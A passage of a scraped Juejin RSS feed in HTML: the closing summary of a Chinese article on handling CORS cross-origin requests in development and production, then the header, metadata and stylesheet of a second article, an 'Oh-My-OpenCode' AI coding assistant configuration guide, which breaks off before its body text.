<li><strong>OPTIONS 请求是多余的</strong>：错！非简单请求（如 POST 带 JSON 数据、自定义头）会先发送 OPTIONS 预检请求，确认后端允许后再发送真实请求。</li>
</ol>
<h4 data-id="heading-84">总结</h4>
<p>跨域的核心是「浏览器同源策略限制」，解决方案的本质是「绕开或告知浏览器允许跨域」：</p>
<ul>
<li>开发环境：优先用 Vite Proxy（配置简单，无需后端配合）；</li>
<li>生产环境：优先用 Nginx 代理（前端无感知，安全性高）或 CORS 跨域头（后端单独搞定）；</li>
<li>避坑关键：分清环境、不滥用 <code>*</code>、理解 CORS 头的作用方（后端）。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Oh-My-OpenCode：打造最强 AI 编程助手配置实战指南]]></title>    <link>https://juejin.cn/post/7602177588442873875</link>    <guid>https://juejin.cn/post/7602177588442873875</guid>    <pubDate>2026-02-03T04:02:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602177588442873875" data-draft-id="7602201748229341203" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Oh-My-OpenCode：打造最强 AI 编程助手配置实战指南"/> <meta itemprop="keywords" content="AI编程"/> <meta itemprop="datePublished" content="2026-02-03T04:02:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小碗细面"/> <meta itemprop="url" content="https://juejin.cn/user/1618104611770958"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Oh-My-OpenCode：打造最强 AI 编程助手配置实战指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1618104611770958/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小碗细面
  </span> <!----> <!----> <div class="vip-level" data-v-cd7d0a50="" data-v-292f6e48=""><span class="tooltip" data-v-cd7d0a50=""><div class="byte-tooltip byte-tooltip--dark" style="display:none;">
        VIP.5 如鱼得水
      </div><span class="byte-tooltip__wrapper"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="VIP.5 如鱼得水" title="VIP.5 如鱼得水" class="lazy" style="aspect-ratio:NaN;" data-v-5244ef91="" data-v-cd7d0a50=""/></span></span></div> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T04:02:14.000Z" title="Tue Feb 03 2026 04:02:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读13分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADsAAAA6CAYAAAAOeSEWAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAABkLSURBVGhDtZoHnJ1llcbP3Om9ZiYzmfSQhCQQIbRQVQKI9CYC68qKriJK0UXcZRcINqStIoiIqKCi1NACQihBWiCkkJ5MJlMyvd7p7d759v989/sy34yTbIj48Atz71ff855znvOc971xDrB/EtoGI7a9Z8Aq+wZML0mNj7dE95NZ1OKsj1dHo1GbnJpss9OTbWJyonvun4VP1Njuoagtb+m0it4By0iIt8LEeMvkr8XFWcfgkA1gYDLf47i2PzpsyU7UspKSLDoctagTZ7Vc08MzClMS7awJ2ZaflBB78CeET8TYla1dtrKt2w5KS7YCDGzEoz2RqKUmhGw6x2bhuXyOp2BoRXef1Q1E7Lj8TIsMD1sbxu1kcnYSAX1810RMTUmyMB7f2j1gC7NS7byinNiL/kH8Q8a+2NRh77b32El56VaPAe0YeGR2mh2bm+FdMRqP1rbZe+3dFsHT35qcb/Oz0rwzo7Gxs9feYPLS4kM2h8lawee5hPmlJXneFQeGAzJ2F564v7rFzi7Msu3d/Xgjzq5g8ArX8VCNN2vJ28daey0zZJabmGCLslP5HOf+Oygr3UzDGOf+JxrauXfQjslJt+dbuuyMgiwmk+sPAB/b2Lt2NdoMZnuY21qHIvbvUyZ4Z0ZQiXGrWjvsmPxsK4R0nmHA8ZCTQvxVQn5eRipklIBtcVbV1WtHYsjati47ZWKuTUpP9Z4yGk/xDBGe3v1mW4/dOrvYO7P/2G9jRSjf31FnXyaUXiB8r51WaJkM3kcfOSa2FR6qarIenooTLQHPLcC4mYThyw1tVpKWYlVERlZ8nC3Oz3Jzdn1nn5uvQ8OOHYvhR/CvsqffJbkCkZTvcYZ6Z0WTfTovw5Y1dtjXp+TbFPhgf7FfxpYxuMfr2uwo8rEtMmwXF+d6Z8wGmIR2PLyjo8cqOFffP2SLGexJEJCP9R29thkPXlpa4A5Y3w/jmuVNYYwO2QkY7WMtz3mVcE1hkualJdmSolzX8GnpKd4VZq80d1o7zN0RdWxGaqItgbn3B/+vsasgh/UMNBOvzYMZDxtDKp289KGaVguFQvb1yQWWwuB97GaSXqUUnVaYbSUwrDCEBz/C2CM8EhNrP13fbkeSh3OJgCAe2N1CWXKsGOc6TOr5U4q8MwYhDtkTda02MyPN+nnGBQEH7A37NHYz5KOZVv08qyjbSseEzKauPnsMj98wc6Ibcj5UUv7M8QWZTE52jEwGOVaD8U1Dw1YNWX0qM8VKyb80L/TrOPYOzH4KBJQTrK8M7+7KZjuM63sHBt17FubGoibCuf+tarWFGUmuwWeT8/vCXo1tZOYeZcazCaez8MwEzzM+HqhqtiJI5twxL1jeGLYk7jmKMF1JOCbg6Qj5nAdRqX7q3BYm8VAmQvW1lfcMc58IT95uIA3q+gftrDHPXUXJWkVEHJme5Bp5UmHsvIZ/O3l8ECE/FWcsItX2hr0ae8O2Wjs+J43QTbOZzGYQ/7Wtxq6eXjRK3r0By4YJ6Ty8EiYSJqcm2eGeV4Pox/ANENJR49RiEdfqcLflUJrEBZqgxYHrBjn2ExFURqKdVETN9YirJxKxR2rbrYeQv5ISmB6IsiDGNfZGWPeMgkzr58xnPaJ5p6XDZPKz4T77wayJ7jGhhXLwanOHTWBgq5n5q6YUwNJ7l3kKcRl7OJ7fF56l1GzvHbSD8dghTPi0wIRfv6XafjJ3ssv0PnZQ7nZx/etwzO1zJ3lHR2OETTw8x0tOx1AN3De0D7YV+63oGthjaJQ5Ur7eVVZjcdGInUyuaT73ZWg3efV8fZs7cc2E777Qi5eunVbghvPPymrt/krKGfcLd8ybYjdxrK6333Z09rjHZkNuLYzz0uIc+xWCZzz8nbHbe4dsY1e/XUOY+nimvtUaSazv4jXhaQasSbmYmpuenGwHZ8TKggSEQm08rMD7ahBOoExcMqXQegjnZ+CEvaEa1ZQUQkt39dj0zDS7krq+ARmpdws/nlNqD9WFbWN7l5u3wr9MyrcXKUsqWy3jTOaoML4DdaQ83YIoT4VYpEXvYQZLmbX5SLohBrgOj186Kc/iKTUPUhq+Rrm5ekOl3TWv1Mr6hqwbY0VOQXwEo+Moq4Z47q5qsU489G944LyJOW4LOLZOKtT/iI6+nGe/0dhuEd4ltj2NmiuCU4hnk5fHIi7+RK4uTEu0e+s7rAiRcw1CYy3OejvcYz+eXeI9MYY9nu3lYZl0KavJJ7Vjibzgjp319rUZE20j7CkJqFr5JQYgQ39f3eQaKpQk0afy8nl4uBzvjUUTRk7k3iebOm0pabDiyFn2XGu3dRME41CGVeBVqSiVnc6hIUpekp1VjHLDSOEcQlui5W/U8C7IKREjv1Gabw3wRwUTvpv7jybPtzHmIPZ49q6KRjuccqBQVCOtGvqXhrCFUUXJzOYSHt7Kw5Ix9H08dSje1o1JyL73IYXpEMmE5CRbw6wuykx2pR+Pd6/J4JpLiJKV6N9OnrcQNfQ0Zem6qQX2MmFXyWTE+DMO0kGx4e08DEjnXbsYuOq7niHB8jdY/wQ8Srm2XCZZUrOakF1CY5EKX0h93Tu/1J4kRdbDMT8MamgZK9xe3uDcvrPe++Y4f61rcZr7B53rN1c5N2ytcV5rCrvHt3T2Og19g+5nH7dvq3bqunr4NOwgK2MHA1jeEDuG7HNuLmtw7qpocl5t6nCPvdTQ7v4N4u3WTqeyu9cZHIo4f6lqdFoHh7wzMbzDeeGv3Hvzjlrnh2W1zofhHuftxpFn3VFe7zxS0+p0DlKVPbhhvBxhvwiFMgfP+mjHA08gEC4pybeLyK1iZldh8zC5VJQyUl8l59KZ0WJk2xaiYWxNrkXXJhA8r3PvZRur7ZZZRfadaRPsfiTmX9HGajC2tXd6V8dQTMhX0h8rNdJx9Ra8F8SbRNLzhPRnJmTZIUTYueTyWxyr7uv3rjC3OkzE8495oS+4xq6D5WoI0bO5WVCOSerl8rIeBrOI/Hkaw6ME5W1zSuzx2la3CRdWi3zIG+FDBvUp9LMgI/vggUmE7KkT81yGvOOgEYa/aUahhRAF5xLec3OzbF1r2O17BbVxIi7hzJIC64IYhXdJA+nh/5xVbOmE9J0QqjSxWk0pp37M2YEtgjS8GpimACu7xkqxdKJ6fEXyYl2Lre0ZtC8yELVewtWUnbfCPIhrvgDFz8WI5yhJKgcnFMZWEFrwhgzo5uWDDDA1oGSOzcu0xfx7vTlsv6posIMpJ6cGWPiw/BxL4PU7vbrpjgf8bMdu5OYwOdhm83DARUSa0ELknYIeEAaILuWxlhGa0M8+EuJCrpJT+ymENhN60pXBxa3LZ5TsucnlGaCmIEQ4Evru91yuz0xMtKaeXluI5zdh9Mm8vAlBn4aR07X64EH3vEKdXQkZJXPP/JxMvNRpLxEtHZ5RQgmNewnpouvVTpYTHdfOnmy5kFUGnpRTfEhXD9DiBdFFJB0/YWS9aj6pmc89r0BaQmgTRkgI+EsdKsYasJZOBF+QqTH474NK7LbyBvf7W+RgOxNyxfQY2/2hrp2+NkroxrzrQ55fSZkpJIa28znCgF6rb7H1hOSslATyvNflAh9pvHcX3lVE/Ya8FjTJIexa2Rq77nfU96unTnD7aME3+TAm6BFKYrPnqCNIqV5sq0ZGCiEV+Db+qWMQqpFgb5KPx48R6omeDl2EuP9DTYt9iGA/f1KBS1w/La+H4ktsSmLItvZHXLUkrCeflVtJ9DVVg1H7+sxiGvVM975rZpfabuqHVhuP5F1vewav5O8GamUe91yDanoYw47FWzC929O+DJnKA2opFY1Rjru5CE7kOcO0jJtQVUIynzuZEMeb+1CEOFXN8iFSGeRpCm1BTlJxVg49Azm819SO7Bu0axEbwn27GuxMck+TMQHDP8fn48gfDVIL4R8xKVPJ73MQBUIfA/Z54LMw5vmlE+w+VFo2A78X/SsyPA/RMD0z3e2qVLtfo7aeBslpMX0N0TEnLcUlKym1jyBFqSohmYntI5enBhYB9CY/2kNarhwJhNiMtRGyWnkQdKaCFyQwgydjyNUw4VchKxXv2/DoKdC+lkQbCX1NlKCGvJiBJkSGbCus6jfo4yGBNySgr+u7e20BCsxdVAcFlJ/tHd32+cIsNxSXUULUUx+dg/d47g7OPYFw2MxkSuyMwLHVTI6PBN6dS8Sppw45zHJSgDXV3aQzmz40Z6fDgBfiAXU0uZxby2zejee+j3eltoQMzhV6qSBogXwrEXDj7ElWxUQ8RrnSaoU0dxIsKaiMvMykXTu90NqJsGHP4z78SdLigUrLKat32nFwy/E07pfDFRdQ/7N5r57pQ1482uvWhMGhQcviGkVrKDUp0ToCxfhQal5n4Hs/g1jOgH4LWdwFOd1b1WzHET4vLZppv+Czjxo840OrDlG8jAJzv2tp5mLK1dsU/lfIOeWy5NxFxfl2BoYImlQtx9QF6mJRQKBsQYYuO2yaLYPBUXvu/VqYPxtHhNy7Y4hCkNLGPtKSklzCVKSHtMQxcqm5Kw1DhI2PTGZtcGDAvoLQ/u7MifYtWFBlxz2H9zo8RkwKzC5UYiG+p44ccqE62YAxLeT/TOpf8MXx8Qk0IJFRY1Go+viQVJpE5Ehjf49xfAZeqGIy/7us3nqxwQfCkjZypPxobVr/6YpQHIalUvuCyEwbSXC9PC8QnkFcXlrgLpoLIhIfKuaqlQkYIAwQnr/f3eyu7KttOw2lNpv8/BPHyjzVNER3o72gvEBKqRMTflndbP8BMweRDyeciEj5bFayFXqTLzheivgYJC0jwzwHa0MDDEotm48ndze5BBBElAnxxcRYHAFh3FfZaA9UNRmC354kNwUx8eHkmVj5dcTE5ZMnuEyr1QqlhtaJLuOYZv4v3KNo0TKrGPUZ1NILPKuWcvVn5Trv10SMB6h0j/ARMnlOuafCBIfnSWEx/Raif3HDzofYMM31dOyY9LBaLK3TjoX2fEqT4+2qaUVWSTQvyM6wC8nNJyEetXIyuLKrx04P7MKNnbJZlKUtNAIHo7i2dA/YU3Vtdi5l6jCepXy8hOedSSSsI8/HQg5Q+gxTKXwkMHkbESo+hjG0lbRRzQ3Fc5LOzDuFhs3Ptumpie7ilRDhlEJOq/hjsZljCxjkt7fWuPS/EekpXMggJQIk0G+eN9Xu2VmHWIkJe0nJRN4ptBBit2yutG9ML7J1DHAxebiAMrZ4VZlduqGS8I2tJc2iborUxmIN79c+kTovFxivPvrcSaP3n7RSKYTUmKt4N3rMOcw4JOneD3sP956jNaMglIeTER5Xbdlt15Tm2W10NEsYrA/N5JLCHHsR9tSqwxq08G3bqm1ZTbOtagnbo6SLvH/VzBL7W7jPzqFea0LmMLFzUuLtdwumuO3i1Vtq7OK15Xgw3l1PDmIXak+6QBEkvB9YJIzBcc/L20JIYaSZ/qAzVm5Ut4oowk3QehC+N3xo/1wTqt7zsYawfX9no9XjqdPXVLhrwyo/wucJYQkE1e4j8rLcBuHUItQQKqgMXb6LGvxFQlXw33AdZLR0V5P9Fr29lP73scNnosoyvdWPv4fPJ+uJrLVtMakqaL1M1cTvv0OLIZE6wk2a2IcIRUQh+DaejpdcXepBa7bKDRGM9PIVxTl2EwarZ72rooVuY4RQtMypdk6e1lLLehhY2lt7QEd7WxlCDvdIli6E9B4+ZIodmZEMccUGqgiZOqru9tkR3iJ8nCcXRWRZCSPMLPEjlx2LjQL1OM5qKAm+vhSuRqSfV5Ttrg8FdWcrnhMqCTex7DEM6qTsVEuM1+8hovaHQ6e6a1Fz0xLd3nUt4ToWWuzWNkhcoAIIjUx2ZpxjLzWF9+SYmngR1lok4TEoJxGfuijhI/7OICoFmadl2llcL9b1oRVJtbD+JLlv1KrhHG5811t9ELbzgk14ICUwqE+TDzftqHPz98vUSy3jSIwP8dCpkNqLDPTx+rArz4T5qLG3G2PrvJKKPoLBWE501NC3ilUX5mVjVIb9nIbgWcpPMiSXjbcL8K62UkR86m1/yfkSeMaHFuK04X0CE3J6SWzFUxw0BSNHlSzi3RmIRJwHq5udO3c16quLp6sbnffbupxbt+12vzOrzuvNHc7ycRbIxuJHgYU7YSASdQgxp7qz2ynv6HJeqW91doa7nLruXof+17sqhhu31Xif9o7HalqczV29Dnrb/f5EXZvzdH27U98/6LR5i3N0UM5zjHU71/lwjRWWltU5CAIn7F1MqLp/r9hQ5RoaxG+qmrxP4yNKcfsFLwuiprffeb2l03m2scO5h3Or2rudzjGrhk8x4Cqu2xcexilBvNEcdi5Yu4tKF3Ue4tzPy+td5/1md4tzw5iJ27NuXEYobYUdlb8z6GTWkdxaCvk2zHjd5mpKQ459mv5TkAp6mQb9Aq9HHQ8S6mrZnuc6vUG6WHusIhCJGNXl9byvnJyaiE7+Eoz8c5TYNQiUveENGpJpcIJ+biS8R0+rlcazGNs7pKB+zPLTOSX2KNWhlDAf4r2Spj72JORB5OyHULX+dlD/FOky/HFy5ygYU0sey/i8moeqdunXK1qC3RuaMOYHlI/raQMl3M+EeTV5WxD3Km8a8PkM8nr648sQ9+esKbf5e/nxiKBfAOQkxbv3SU9LYmqPV9V/Pn+V20VwTyVjTqCI6edEQUOFUXs9WmfSll8DyX2dt7GlnwkswaM3l9XZ0oNK3MTXbxpOV2sGk69s6XCJw4cY8KbyRrt9TrHt7Bm0rRBQe1+fHUWNfaapU0KbqxzbORC1M/LS3dJwIl3KOrwykQG/E+61q+isgniztdOKqNOziDgZqZIzFwPvqGiyg5NCtoCqoG5NxHhPZTOsnORulKskjoKMDeLuXQ3OmnC3syxARFXdfc57LR3OrdtrvSOOs55rnqhtcdoGhpxHdjc5EfJUuHZTlftX+G15rXPlhkrnLe59F7Lz8VGHdg8c5y2OLeMZ126qduq9XC3v7nd+FchLvYPJd15gPCu8XQnh/qpm59WGVudZzvvQO97kXTcGxhnEuJvR39tWY8cwK4uhcikk4a3Gdstg9l5B2t0wfaTdWkEou5vCPOV5PH73vFL3+DfXltnh6OxjkJD6Wd5F3g88tMe6CW/7YmI99VIL4u0oqUK8ocW4d8hFrXMVoOQU8s3U97MnjvDD/XRYkyhHM1MT3GVZQR2Tdv70U8EbA5vlo+CaPAaaSWoZXm50otGodxQ6L6txGKxzw5ZYORrBsPPrykZKQIy1n8bTjwb2fO4Te3ue7x6KOKvaYns1wtIddd4nx3mwot55qyl2360cp81zurg+CGqwU8v4/Of5uAVvPgObrwvHomY8jOtZ4fXWLnefdHVXv9044+8ZklCx75DXwcV1Sb27y+vInUQEuVYSaMgRJYfAwtoj0raFxIUW1A8nz35f02qLc9Lc9lG7CBkwtUR7bf+A+5uL6ehnH9Lat+5sIEfj3Cbj3NKRvP7Rjlo7FSmqavKvpSP8MRZ7NVbQYLSkqlC9ZW4sPH18gBTcORjrhMWmQWzFmK2UsvO90qQ1oZcI8UhkCLZPtRqMy0NirobAvjIpb4/sW06qKGyPR2oGIdlazjOOTk+kLYzaaYGSp63Wz6HsXsQ51wd+LTAuZOy+8GBNq7tF+IOdDU4kENJthNID5YRafZtzZ3mDs9LbRgzixcZ2l1h83OKFbDmEd0/FiFp7DWHgp0AQGzq6nf8hPF+oa3EehOz0ziCWcm4NpBRMhX1hn571oR9wqVVSDVPtUi32sQ0vbu7scZdY9aOt2ZSEL9BEBIW+dv20AKDd9/ep09oimYqHpyImkKDuRllS4PrlHNuIqDmCJmNJQba7q1joEaUQJuR/WdXsLrJrq/L6cdJsPOyXscJ7GLKqo8cOpqhrO//yQG6oS3kZwS9xPkRB3wi7diFMtDN+PLk5m1ath+8f0Fy80dbjhvVXub+U5mEqeal27UP+dWpPlknNxW79Ak6/7Tg3UMOF52j1xA1qK7Trd6nXC+8P9ttYQcumIonLSnJtBdJNa77axw1C2x3qR4Wqnj73x9f6MbV+CCYFBZO6y51aSh3gzVrsmwzJnULEbCJC1oZ7vIZ/9Iqmfvn2u5oWO5n8fApxcuWUApum5diPgY9lrA9EtvUNOzYf8vqAcJPsU5iOh7XtXQgt2uZhjKU2amF7HQyfEYWcZk5yQ1RDKNrLcq02k/9IGmldrB93KiokPw8EB2SsoKWXO5FmxXhlckqi+3vEUvLqwok5PHVkIWAszlqzy1p54zuLpnPZ3q9bod08JlLSb5DrNxDm38Sbvsg5EBywsT7oH+3XNW3uasGirFSrxRNdCllKiPZHZzJYLZb5qEcpae3pxMCuu9oibS5/QCOiLcYUrp+MmtJeURjFdVlxzqiae6D4h40NQt54HyGv3JRo10aVfv8YhtC0pSlVKcPFuxIXahr08mzCO4VzMlLSsZuomZ+RaucU0rXsw/sfF5+osUFonWob/7TrLdaUgdpV93fl9X+VIC0Y6tek2uI8OD3J5gT2Vj9ZmP0f4IM4iY7RQ5gAAAAASUVORK5CYII=) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body 